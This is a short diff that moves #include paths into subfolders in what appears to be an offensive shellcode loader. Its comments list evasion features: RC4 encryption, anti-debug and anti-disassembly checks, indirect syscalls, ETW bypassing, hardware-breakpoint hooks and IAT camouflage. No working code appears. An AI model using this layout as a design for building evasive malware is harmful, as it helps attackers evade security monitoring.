@@ -1,24 +1,24 @@
 #include "structs.h"
-#include "debug.h"
+#include "debug/debug.h"
 
 // Custom loader api function
 #include "custom_loaderapi.h"
 
 // Crypt
-#include "rc4.h"
+#include "encryption/rc4.h"
 
 // Anti-XXXX functions
-#include "anti-debug.h"
-#include "anti-disass.h"
+#include "anti-analysis/anti-debug.h"
+#include "anti-analysis/anti-disass.h"
 
 // Indirect syscalls via tartarus gate
 #include "indirect_syscall.h"
 
 // Mutant creation
-#include "mutex.h"
+#include "mutex/mutex.h"
 
 // ETW Bypassing
-#include "etw.h"
+#include "ETW/etw.h"
 
 // Include all typedefs and string hashes
 #include "typedefs.h"
@@ -27,16 +27,16 @@
 #include "helper_functions.h"
 
 // Exception handler
-#include "exception_handler.h"
+#include "hooks/exception_handler.h"
 
 // Hardware Breakpoints
-#include "hwbp.h"
+#include "hooks/hwbp.h"
 
 // Hook functions
-#include "hook_functions.h"
+#include "hooks/hook_functions.h"
 
 // IAT camoflage
-#include "iat_camoflage.h"
+#include "IAT/iat_camoflage.h"
 
 // include the resource (shellcode)
 #include "resource.h"
